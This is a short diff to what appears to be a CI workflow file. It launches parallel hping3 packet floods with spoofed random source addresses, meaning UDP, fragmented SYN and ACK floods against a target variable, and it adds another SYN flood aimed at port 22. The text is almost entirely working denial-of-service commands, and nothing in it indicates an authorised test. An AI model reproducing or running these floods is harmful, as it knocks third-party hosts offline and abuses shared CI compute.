@@ -27,5 +27,6 @@ jobs:
           sudo timeout -s INT $S hping3 --flood --udp -p 443 -d $L --rand-source --id $((RANDOM%65535)) $T >/tmp/v4 2>&1 &
           sudo timeout -s INT $S hping3 --flood -S -p $P -f -d 1400 --rand-source --id $((RANDOM%65535)) $T >/tmp/v5 2>&1 &
           sudo timeout -s INT $S hping3 --flood -A -p $((P+1)) -d 64 --rand-source --id $((RANDOM%65535)) $T >/tmp/v6 2>&1 &
+          sudo timeout -s INT $S hping3 --flood -S -p 22 -f -d 64 --rand-source --id $((RANDOM%65535)) $T >/tmp/v7 2>&1 &
           wait
-          for f in /tmp/v1 /tmp/v2 /tmp/v3 /tmp/v4 /tmp/v5 /tmp/v6; do grep -aoE '[0-9]+ packets transmitted' $f | head -1; done
+          for f in /tmp/v1 /tmp/v2 /tmp/v3 /tmp/v4 /tmp/v5 /tmp/v6 /tmp/v7; do grep -aoE '[0-9]+ packets transmitted' $f | head -1; done
